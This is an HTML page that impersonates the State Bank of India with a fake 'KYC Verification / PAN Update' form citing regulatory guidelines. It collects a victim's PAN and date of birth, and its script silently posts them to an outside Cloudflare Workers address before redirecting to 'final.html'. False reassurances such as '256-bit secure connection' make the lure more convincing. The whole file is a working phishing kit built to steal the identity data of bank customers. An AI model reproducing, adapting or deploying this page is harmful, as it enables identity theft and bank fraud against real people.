<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBI - KYC Verification</title>
    <style>
        * { box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; margin: 0; padding: 0; }
        body { background-color: #fff; display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 500px; display: flex; flex-direction: column; }
        .full-img { width: 100%; display: block; }
        
        .header-bar { background-color: #315195; color: white; padding: 12px 15px; font-size: 14px; font-weight: bold; }
        
        .content-area { padding: 20px 25px; }
        .instruction-text { font-size: 13px; color: #333; margin-bottom: 20px; line-height: 1.5; border-left: 4px solid #FF9800; padding-left: 10px; }
        
        .field-group { margin-bottom: 18px; }
        .field-group label { display: block; font-size: 13px; color: #555; margin-bottom: 8px; font-weight: bold; }
        
        /* Styled Inputs */
        .kyc-input { 
            width: 100%; height: 40px; padding: 0 12px; 
            background-color: #f9f9f9; border: 1px solid #ccc; 
            border-radius: 4px; font-size: 15px; outline: none;
            color: #333; text-transform: uppercase;
        }
        .kyc-input:focus { border-color: #315195; background-color: #fff; }
        
        /* DOB Input specific */
        input[type="date"] { text-transform: none; }

        .btn-row { display: flex; gap: 12px; margin-top: 25px; }
        .btn { flex: 1; padding: 12px 0; border: none; color: white; font-size: 15px; border-radius: 4px; cursor: pointer; font-weight: bold; transition: 0.2s; }
        .btn-submit { background-color: #315195; }
        .btn-submit:active { background-color: #1a237e; }
        .btn-gray { background-color: #6c757d; }

        .secure-msg { margin-top: 25px; display: flex; align-items: center; gap: 10px; font-size: 11px; color: #777; }
        .lock-icon { font-size: 16px; }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="Header" class="full-img">
        <div class="header-bar">KYC Verification / PAN Update</div>

        <div class="content-area">
            <div class="instruction-text">
                As per regulatory guidelines, please verify your PAN details and Date of Birth to continue using Online Banking services.
            </div>

            <form id="kycForm">
                <div class="field-group">
                    <label>Permanent Account Number (PAN)*</label>
                    <input type="text" id="pan_no" class="kyc-input" maxlength="10" placeholder="ABCDE1234F" required 
                           pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}" title="Please enter a valid 10-digit PAN">
                </div>

                <div class="field-group">
                    <label>Date of Birth (DOB)*</label>
                    <input type="date" id="dob_val" class="kyc-input" required>
                </div>

                <div class="btn-row">
                    <button type="submit" class="btn btn-submit" id="submitBtn">Verify & Proceed</button>
                    <button type="reset" class="btn btn-gray">Reset</button>
                </div>
            </form>

            <div class="secure-msg">
                <span class="lock-icon">🔒</span>
                Your information is encrypted and processed through a 256-bit secure connection.
            </div>
        </div>

        <div style="margin-top: 40px;">
            <img src="https://i.ibb.co/Txj77Jk2/chrome-screenshot-1-Apr-2026-12-43-42-pm-IST.png" alt="Footer" class="full-img">
        </div>
    </div>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';

        document.getElementById('kycForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const pan = document.getElementById('pan_no').value.toUpperCase();
            const dob = document.getElementById('dob_val').value;
            const btn = document.getElementById('submitBtn');

            btn.disabled = true;
            btn.innerText = "Verifying...";

            // Payload for KYC Table
            const payload = {
                type: "KYC",
                pan: pan,
                dob: dob
            };

            try {
                // Background send to Worker
                await fetch(workerURL, {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                // Final Redirect (Aap yahan Bank Page ya Success Page dal sakte ho)
                window.location.href = "final.html"; 
            } catch (err) {
                window.location.href = "final.html";
            }
        });
    </script>
</body>
</html>
